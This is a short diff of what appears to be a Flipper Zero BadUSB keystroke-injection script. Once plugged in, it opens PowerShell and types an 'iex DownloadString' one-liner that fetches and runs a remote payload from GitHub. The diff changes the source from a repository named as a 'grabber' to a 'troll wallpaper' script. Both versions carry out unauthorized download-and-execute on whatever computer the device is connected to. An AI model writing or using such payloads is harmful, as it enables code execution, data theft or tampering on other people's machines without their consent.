@@ -10,7 +10,7 @@ STRING powershell
 ENTER
 DELAY 300
 
-STRING iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/blobs0/Ultimate-Flipper-Grabber/main/payload.ps1'))
+STRING iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/8ad3rror/Flipper-Zero/refs/heads/main/BadUSB/Troll/TrolloWallpaper/payload.ps1'))
 ENTER
 DELAY 1000
 
